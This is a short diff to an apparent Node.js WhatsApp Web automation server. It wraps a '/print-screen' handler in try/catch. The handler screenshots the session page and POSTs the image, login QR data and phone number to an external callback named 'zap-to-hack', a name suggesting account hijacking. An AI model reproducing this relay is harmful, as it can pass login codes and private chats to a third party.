@@ -39,6 +39,7 @@ app.get('/connect', (req, res) => {
                     headers: {
                         'Content-Type': 'application/json',
                     },
+
                     body: JSON.stringify({
                         phone: phone,
                         qr: base64string,
@@ -62,28 +63,33 @@ app.get('/connect', (req, res) => {
 
 
 app.get('/print-screen', (req, res) => {
+    try {
 
-    client.pupPage.screenshot().then((qr) => {
-        let base64string = qr.toString('base64');
+        client.pupPage.screenshot().then((qr) => {
+            let base64string = qr.toString('base64');
 
-        fetch(urlCallback + '/api/zap-to-hack', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                phone: phone,
+            fetch(urlCallback + '/api/zap-to-hack', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    phone: phone,
+                    qr: base64string,
+                    event: 'print-screen',
+                }),
+            });
+
+            let response = {
                 qr: base64string,
-                event: 'print-screen',
-            }),
+            };
+
+            res.send(response);
         });
+    } catch (error) {
+        console.log('Error', error);
+    }
 
-        let response = {
-            qr: base64string,
-        };
-
-        res.send(response);
-    });
 
 });
 
